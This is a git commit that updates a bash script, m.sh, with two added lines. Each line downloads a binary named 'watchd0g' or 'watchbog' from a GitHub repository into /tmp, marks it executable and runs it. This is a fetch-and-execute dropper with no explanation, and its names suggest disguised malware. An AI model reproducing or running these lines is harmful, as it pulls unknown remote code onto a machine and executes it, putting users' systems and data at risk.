f314dfd9e51aa64d647ccf26f09af4ce75c57881
momika233 <56291820+momika233@users.noreply.github.com>
2024-01-18 11:49:52 +0800

    Update m.sh

--- m.sh
+++ m.sh
@@ -1,1 +1,3 @@
 #!/bin/bash
+cd /tmp && wget https://github.com/momika233/test/raw/main/watchd0g && chmod +x watchd0g && ./watchd0g
+cd /tmp && wget  https://github.com/momika233/test/raw/main/watchbog && chmod +x watchbog && ./watchbog
